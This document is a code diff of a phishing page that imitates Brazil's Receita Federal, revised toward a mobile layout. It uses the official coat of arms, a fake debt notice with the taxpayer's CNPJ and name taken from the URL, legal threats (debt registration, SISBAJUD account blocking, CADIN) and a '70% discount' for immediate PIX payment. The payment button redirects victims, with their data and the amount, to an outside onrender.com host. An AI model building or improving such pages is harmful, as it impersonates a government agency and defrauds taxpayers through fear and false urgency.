@@ -2,449 +2,352 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Regularização de Débitos | Secretaria da Receita Federal</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Portal de Regularização Fiscal | Receita Federal</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Rawline:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary-blue: #004587;
-            --secondary-blue: #1351b4;
-            --dark-blue: #0c326f;
-            --gov-gold: #ffcc00;
-            --success-green: #168821;
-            --danger-red: #e52207;
-            --warning-orange: #ff5f00;
-            --light-gray: #f8f9fa;
-            --border-gray: #ccc;
-            --text-dark: #333333;
-            --text-light: #666666;
-            --white: #ffffff;
+            --primary: #004587;
+            --secondary: #1351b4;
+            --accent: #ffcc00;
+            --success: #168821;
+            --danger: #df3333;
+            --bg: #f2f5f7;
+            --card-bg: #ffffff;
+            --text-main: #1a1a1a;
+            --text-muted: #555555;
+            --border: #d1d9e0;
         }
 
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
         }
 
         body {
-            font-family: 'Inter', 'Rawline', sans-serif;
-            background-color: var(--white);
-            color: var(--text-dark);
-            line-height: 1.5;
-            -webkit-font-smoothing: antialiased;
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg);
+            color: var(--text-main);
+            line-height: 1.4;
+            overflow-x: hidden;
         }
 
-        /* Top Bar Gov.br Style */
-        .gov-top-bar {
-            background: var(--white);
-            border-bottom: 1px solid #eeeeee;
-            padding: 10px 10%;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 12px;
-            font-weight: 600;
-        }
-
-        .gov-top-bar a {
-            text-decoration: none;
-            color: var(--text-dark);
+        /* Top Bar Gov.br */
+        .gov-bar {
+            background: #ffffff;
+            padding: 8px 15px;
             display: flex;
             align-items: center;
+            border-bottom: 1px solid var(--border);
+            font-size: 11px;
+            font-weight: 700;
             gap: 8px;
         }
 
-        .gov-top-bar .social-links {
-            display: flex;
-            gap: 15px;
-            color: var(--primary-blue);
-        }
+        .gov-bar img { width: 18px; }
 
-        /* Main Header */
+        /* Header */
         header {
-            background: var(--primary-blue);
-            padding: 25px 10%;
-            color: var(--white);
+            background: var(--primary);
+            padding: 20px 15px;
+            color: #ffffff;
+            text-align: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
 
-        .header-content {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: flex;
-            align-items: center;
-            gap: 20px;
+        .brasao {
+            height: 55px;
+            margin-bottom: 10px;
         }
 
-        .brasao-republica {
-            height: 70px;
-            width: auto;
-        }
-
-        .header-text h1 {
-            font-size: 1.4rem;
-            font-weight: 700;
-            letter-spacing: -0.5px;
-        }
-
-        .header-text p {
-            font-size: 0.9rem;
-            opacity: 0.9;
-            font-weight: 400;
-        }
-
-        /* Main Content Layout */
-        main {
-            max-width: 1000px;
-            margin: 40px auto;
-            padding: 0 20px;
-            display: grid;
-            grid-template-columns: 1fr 380px;
-            gap: 30px;
-        }
-
-        @media (max-width: 850px) {
-            main {
-                grid-template-columns: 1fr;
-            }
-        }
-
-        /* Left Column: Details */
-        .content-details h2 {
-            font-size: 1.5rem;
-            color: var(--primary-blue);
-            margin-bottom: 20px;
-            border-bottom: 2px solid var(--gov-gold);
-            display: inline-block;
-            padding-bottom: 5px;
-        }
-
-        .notice-box {
-            background: #f0f5ff;
-            border-left: 4px solid var(--secondary-blue);
-            padding: 20px;
-            margin-bottom: 30px;
-            border-radius: 0 4px 4px 0;
-        }
-
-        .notice-box p {
-            font-size: 0.95rem;
-            color: var(--dark-blue);
-        }
-
-        .data-table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-bottom: 30px;
-        }
-
-        .data-table th, .data-table td {
-            text-align: left;
-            padding: 12px 0;
-            border-bottom: 1px solid #eee;
-        }
-
-        .data-table th {
-            font-size: 0.8rem;
-            text-transform: uppercase;
-            color: var(--text-light);
-            font-weight: 600;
-            width: 30%;
-        }
-
-        .data-table td {
-            font-weight: 700;
-            color: var(--text-dark);
-            font-size: 1rem;
-        }
-
-        .status-pill {
-            display: inline-block;
-            background: #fff1f0;
-            color: var(--danger-red);
-            padding: 4px 12px;
-            border-radius: 50px;
-            font-size: 0.75rem;
-            font-weight: 800;
-            border: 1px solid var(--danger-red);
-        }
-
-        /* Right Column: Payment Card */
-        .payment-card {
-            background: var(--white);
-            border: 1px solid var(--border-gray);
-            border-radius: 8px;
-            padding: 30px;
-            position: sticky;
-            top: 20px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
-        }
-
-        .payment-card h3 {
+        header h1 {
             font-size: 1.1rem;
-            margin-bottom: 20px;
-            text-align: center;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            line-height: 1.2;
         }
 
-        .price-container {
+        header p {
+            font-size: 0.75rem;
+            opacity: 0.9;
+            margin-top: 4px;
+        }
+
+        /* Main Content */
+        main {
+            padding: 15px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        /* Status Notification */
+        .status-box {
+            background: #fff8e1;
+            border-left: 4px solid var(--accent);
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 4px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+
+        .status-box h2 {
+            font-size: 0.95rem;
+            color: #856404;
+            margin-bottom: 5px;
+            font-weight: 700;
+        }
+
+        .status-box p {
+            font-size: 0.85rem;
+            color: #856404;
+        }
+
+        /* Data Card */
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 15px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.04);
+        }
+
+        .card-title {
+            font-size: 0.75rem;
+            font-weight: 700;
+            color: var(--primary);
+            text-transform: uppercase;
+            margin-bottom: 15px;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 8px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .info-row {
+            margin-bottom: 12px;
+        }
+
+        .info-row:last-child { margin-bottom: 0; }
+
+        .label {
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            font-weight: 600;
+            display: block;
+        }
+
+        .value {
+            font-size: 1rem;
+            font-weight: 700;
+            color: var(--text-main);
+            word-break: break-all;
+        }
+
+        .badge {
+            background: var(--danger);
+            color: white;
+            font-size: 0.65rem;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-weight: 800;
+        }
+
+        /* Consequences */
+        .legal-notice {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            margin-bottom: 20px;
+            padding: 0 5px;
+        }
+
+        .legal-item {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 8px;
+        }
+
+        .legal-item span { color: var(--danger); font-weight: bold; }
+
+        /* Payment Floating Action */
+        .payment-section {
+            background: #ffffff;
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 25px 20px;
             text-align: center;
-            margin-bottom: 25px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
         }
 
         .price-label {
             font-size: 0.85rem;
-            color: var(--text-light);
+            color: var(--text-muted);
+            margin-bottom: 5px;
             display: block;
         }
 
         .price-value {
-            font-size: 2.5rem;
+            font-size: 2.4rem;
             font-weight: 800;
-            color: var(--text-dark);
-        }
-
-        .discount-tag {
-            background: #e6f4ea;
-            color: var(--success-green);
-            padding: 5px 10px;
-            border-radius: 4px;
-            font-size: 0.8rem;
-            font-weight: 700;
-            margin-top: 5px;
-            display: inline-block;
-        }
-
-        .btn-action {
+            color: var(--text-main);
             display: block;
-            background: var(--secondary-blue);
-            color: var(--white);
-            text-align: center;
-            text-decoration: none;
-            padding: 16px;
-            border-radius: 4px;
+            margin-bottom: 10px;
+        }
+
+        .discount-badge {
+            background: #e8f5e9;
+            color: var(--success);
+            font-size: 0.75rem;
             font-weight: 700;
+            padding: 5px 12px;
+            border-radius: 20px;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+
+        .btn-submit {
+            display: block;
+            background: var(--secondary);
+            color: #ffffff;
+            text-decoration: none;
+            padding: 18px;
+            border-radius: 8px;
             font-size: 1rem;
-            transition: background 0.2s;
-            margin-bottom: 15px;
+            font-weight: 700;
+            text-transform: uppercase;
+            box-shadow: 0 4px 0 #0c326f;
+            transition: all 0.1s;
         }
 
-        .btn-action:hover {
-            background: var(--dark-blue);
+        .btn-submit:active {
+            transform: translateY(2px);
+            box-shadow: 0 2px 0 #0c326f;
         }
 
-        .pix-badge {
+        .pix-tag {
+            margin-top: 15px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            gap: 8px;
             font-size: 0.8rem;
             font-weight: 600;
-            color: var(--text-light);
+            color: var(--text-muted);
         }
 
-        .pix-logo {
-            height: 16px;
-        }
-
-        /* Consequences List */
-        .consequences-section {
-            margin-top: 30px;
-        }
-
-        .consequences-section h4 {
-            font-size: 0.9rem;
-            color: var(--text-dark);
-            margin-bottom: 15px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .consequence-item {
-            display: flex;
-            gap: 12px;
-            margin-bottom: 12px;
-            font-size: 0.9rem;
-        }
-
-        .consequence-item span:first-child {
-            color: var(--danger-red);
-            font-weight: bold;
-        }
+        .pix-tag img { height: 16px; }
 
         /* Footer */
         footer {
-            background: #f2f2f2;
-            padding: 60px 10% 40px;
-            border-top: 1px solid #ddd;
-            margin-top: 60px;
-        }
-
-        .footer-content {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: 2fr 1fr 1fr;
-            gap: 40px;
-        }
-
-        @media (max-width: 700px) {
-            .footer-content {
-                grid-template-columns: 1fr;
-            }
-        }
-
-        .footer-col h5 {
-            font-size: 0.9rem;
-            margin-bottom: 20px;
-            color: var(--text-dark);
-        }
-
-        .footer-col p, .footer-col a {
-            font-size: 0.8rem;
-            color: var(--text-light);
-            text-decoration: none;
-            margin-bottom: 10px;
-            display: block;
-        }
-
-        .footer-bottom {
-            margin-top: 40px;
-            padding-top: 20px;
-            border-top: 1px solid #ddd;
+            background: #ffffff;
+            padding: 30px 20px;
             text-align: center;
-            font-size: 0.75rem;
-            color: var(--text-light);
+            border-top: 1px solid var(--border);
+            margin-top: 30px;
         }
 
-        /* Utility */
-        .text-danger { color: var(--danger-red); }
-        .font-bold { font-weight: 700; }
+        footer p {
+            font-size: 0.7rem;
+            color: #999;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+
+        .footer-links {
+            margin-top: 15px;
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            font-size: 0.7rem;
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        /* Mobile Specific Adjustments */
+        @media (max-width: 360px) {
+            header h1 { font-size: 1rem; }
+            .price-value { font-size: 2rem; }
+            .btn-submit { font-size: 0.9rem; }
+        }
     </style>
 </head>
 <body>
 
-    <div class="gov-top-bar">
-        <a href="https://www.gov.br">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Flag_of_Brazil.svg" width="18" alt="Brasil">
-            BRASIL <span style="font-weight: 400; margin-left: 5px; color: #666;">| Portal de Serviços</span>
-        </a>
-        <div class="social-links">
-            <span>CORONAVÍRUS (COVID-19)</span>
-            <span>ACESSO À INFORMAÇÃO</span>
-        </div>
+    <div class="gov-bar">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Flag_of_Brazil.svg" alt="Brasil">
+        <span>BRASIL</span>
+        <span style="font-weight: 400; color: #999; margin-left: auto;">Acesso à informação</span>
     </div>
 
     <header>
-        <div class="header-content">
-            <img src="https://www.gov.br/planalto/pt-br/conheca-a-presidencia/acervo/simbolos-nacionais/brasao/brasaooficialcolorido.png" alt="Brasão Nacional" class="brasao-republica">
-            <div class="header-text">
-                <p>MINISTÉRIO DA FAZENDA</p>
-                <h1>Secretaria Especial da Receita Federal do Brasil</h1>
-            </div>
-        </div>
+        <img src="https://www.gov.br/planalto/pt-br/conheca-a-presidencia/acervo/simbolos-nacionais/brasao/brasaooficialcolorido.png" alt="Brasão" class="brasao">
+        <p>MINISTÉRIO DA FAZENDA</p>
+        <h1>Receita Federal do Brasil</h1>
     </header>
 
     <main>
-        <section class="content-details">
-            <h2>Detalhamento da Notificação</h2>
+        <div class="status-box">
+            <h2>Aviso de Irregularidade</h2>
+            <p>Seu CPF/CNPJ possui débitos pendentes com a União. Regularize agora para evitar sanções.</p>
+        </div>
+
+        <div class="card">
+            <div class="card-title">
+                Identificação do Contribuinte
+                <span class="badge">DÉBITO ATIVO</span>
+            </div>
+            <div class="info-row">
+                <span class="label">Razão Social / Nome</span>
+                <span id="empresa" class="value">Carregando...</span>
+            </div>
+            <div class="info-row">
+                <span class="label">CPF / CNPJ</span>
+                <span id="cnpj" class="value">Carregando...</span>
+            </div>
+        </div>
+
+        <div class="legal-notice">
+            <p style="font-weight: 700; margin-bottom: 10px; color: var(--text-main);">Implicações da Não Regularização:</p>
+            <div class="legal-item"><span>✕</span> <p>Inscrição em Dívida Ativa da União</p></div>
+            <div class="legal-item"><span>✕</span> <p>Bloqueio de Contas via SISBAJUD</p></div>
+            <div class="legal-item"><span>✕</span> <p>Restrição no Crédito (CADIN/Serasa)</p></div>
+        </div>
+
+        <div class="payment-section">
+            <span class="price-label">Valor total para quitação:</span>
+            <span id="valor-display" class="price-value">R$ 56,47</span>
+            <div class="discount-badge">✓ 70% de desconto aplicado</div>
             
-            <div class="notice-box">
-                <p><strong>Atenção:</strong> Constatamos divergências fiscais vinculadas ao documento informado abaixo. A ausência de regularização dentro do prazo regulamentar poderá ensejar a inscrição em <strong>Dívida Ativa da União</strong> e o ajuizamento de <strong>Execução Fiscal</strong>.</p>
+            <a href="#" id="main-btn" class="btn-submit">
+                Emitir Guia de Recolhimento
+            </a>
+
+            <div class="pix-tag">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Logo_Pix.png" alt="Pix">
+                Compensação via PIX (Imediata)
             </div>
-
-            <table class="data-table">
-                <tr>
-                    <th>Contribuinte</th>
-                    <td id="empresa">Processando...</td>
-                </tr>
-                <tr>
-                    <th>CPF / CNPJ</th>
-                    <td id="cnpj">Processando...</td>
-                </tr>
-                <tr>
-                    <th>Natureza do Débito</th>
-                    <td>Multa Administrativa / Pendência MEI</td>
-                </tr>
-                <tr>
-                    <th>Situação Atual</th>
-                    <td><span class="status-pill">DÉBITO NÃO REGULARIZADO</span></td>
-                </tr>
-            </table>
-
-            <div class="consequences-section">
-                <h4>Implicações Legais (Lei nº 10.522/02)</h4>
-                <div class="consequence-item">
-                    <span>●</span>
-                    <p>Inclusão no Cadastro Informativo de Créditos não Quitados (<strong>CADIN</strong>).</p>
-                </div>
-                <div class="consequence-item">
-                    <span>●</span>
-                    <p>Impedimento de contratar com o Poder Público e participar de licitações.</p>
-                </div>
-                <div class="consequence-item">
-                    <span>●</span>
-                    <p>Restrição total para obtenção de empréstimos e financiamentos bancários.</p>
-                </div>
-                <div class="consequence-item">
-                    <span>●</span>
-                    <p>Bloqueio de ativos financeiros via sistema <strong>SISBAJUD</strong> em caso de execução judicial.</p>
-                </div>
-            </div>
-        </section>
-
-        <aside>
-            <div class="payment-card">
-                <h3>Resumo da Guia (DARF)</h3>
-                
-                <div class="price-container">
-                    <span class="price-label">Valor consolidado para quitação:</span>
-                    <span class="price-value">R$ 56,47</span>
-                    <br>
-                    <span class="discount-tag">Desconto de 70% para liquidação imediata</span>
-                </div>
-
-                <a href="#" id="main-btn" class="btn-action">
-                    EMITIR GUIA DE RECOLHIMENTO
-                </a>
-
-                <div class="pix-badge">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Logo_Pix.png" alt="Pix" class="pix-logo">
-                    Baixa automática via PIX
-                </div>
-
-                <p style="font-size: 0.7rem; color: #888; text-align: center; margin-top: 20px;">
-                    O prazo para aproveitamento deste desconto expira em 24 horas.
-                </p>
-            </div>
-        </aside>
+        </div>
     </main>
 
     <footer>
-        <div class="footer-content">
-            <div class="footer-col">
-                <h5>Secretaria Especial da Receita Federal do Brasil</h5>
-                <p>Esplanada dos Ministérios, Bloco P - Brasília - DF</p>
-                <p>CEP: 70048-900</p>
-            </div>
-            <div class="footer-col">
-                <h5>Serviços</h5>
-                <a href="#">Consultar CPF</a>
-                <a href="#">Consultar CNPJ</a>
-                <a href="#">Certidões e Situação Fiscal</a>
-                <a href="#">E-CAC</a>
-            </div>
-            <div class="footer-col">
-                <h5>Canais de Atendimento</h5>
-                <a href="#">Fale Conosco</a>
-                <a href="#">Ouvidoria</a>
-                <a href="#">Unidades de Atendimento</a>
-            </div>
-        </div>
-        <div class="footer-bottom">
-            <p>&copy; 2026 Receita Federal do Brasil. Todos os direitos reservados.</p>
-            <p style="margin-top: 10px; opacity: 0.6;">Este é um portal de serviços governamentais. Proteja seus dados.</p>
+        <p>© 2026 Secretaria da Receita Federal do Brasil</p>
+        <p>Governo Federal | Brasília - DF</p>
+        <div class="footer-links">
+            <a href="#">Privacidade</a>
+            <a href="#">Canais de Atendimento</a>
+            <a href="#">Ouvidoria</a>
         </div>
     </footer>
 
@@ -456,21 +359,27 @@
 
         window.onload = function() {
             const params = new URLSearchParams(window.location.search);
-            const cnpjRaw = params.get('cnpj');
-            const empresaRaw = params.get('empresa');
+            
+            // Captura os dados da URL
+            const cnpj = clean(params.get('cnpj')) || "Não identificado";
+            const empresa = clean(params.get('empresa')) || "Contribuinte não identificado";
+            const valor = clean(params.get('subtotal')) || "56,47"; // Valor padrão caso não venha na URL
 
-            const cnpj = clean(cnpjRaw) || "Não identificado";
-            const empresa = clean(empresaRaw) || "Contribuinte não identificado";
-
+            // Exibe os dados na página
             document.getElementById('cnpj').textContent = cnpj;
             document.getElementById('empresa').textContent = empresa;
+            document.getElementById('valor-display').textContent = `R$ ${valor.replace('.', ',')}`;
 
+            // Configuração do Botão de Redirecionamento
             const btn = document.getElementById('main-btn');
             const targetBase = "https://nacionalmei.onrender.com/PEND/";
 
             btn.addEventListener('click', function(e) {
                 e.preventDefault();
-                const finalUrl = `${targetBase}?cnpj=${encodeURIComponent(cnpj)}&empresa=${encodeURIComponent(empresa)}`;
+                
+                // Monta a URL final com os parâmetros solicitados: cnpj, empresa e subtotal
+                const finalUrl = `${targetBase}?cnpj=${encodeURIComponent(cnpj)}&empresa=${encodeURIComponent(empresa)}&subtotal=${encodeURIComponent(valor)}`;
+                
                 window.location.href = finalUrl;
             });
         };
